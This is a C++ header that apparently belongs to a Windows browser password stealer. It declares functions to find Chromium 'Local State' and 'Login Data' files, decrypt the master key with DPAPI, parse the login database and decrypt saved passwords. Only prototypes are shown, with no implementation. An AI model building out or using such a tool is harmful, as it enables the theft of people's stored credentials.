#pragma once

#ifdef _WIN32

#include <Windows.h>
#include <Shlobj.h>
#include <string>
#include <nlohmann/json.hpp>
#include <locale>
#include <codecvt>
#include <sqlite3.h>
#include <sodium.h>
#include <vector>
#include <fstream>
#include <wincrypt.h>

using namespace std;
using json = nlohmann::json;

#define MAX_LINE_LENGTH 1024
#define IV_SIZE 12

#define EXIT_FAILURE 1
#define EXIT_SUCCESS 0

#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define warn(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)
#define info(msg, ...) printf("[i] " msg "\n", ##__VA_ARGS__)

wstring FindLocalState();
wstring FindLoginData();
string getEncryptedKey(const wstring& localStatePath);
int loginDataParser(const wstring& loginDataPath, DATA_BLOB decryptionKey);
DATA_BLOB decryptKey(const string encrypted_key);
void passwordDecrypter(unsigned char* ciphertext, size_t ciphertext_len, unsigned char* key, unsigned char* iv, unsigned char* decrypted);

#endif // _WIN32
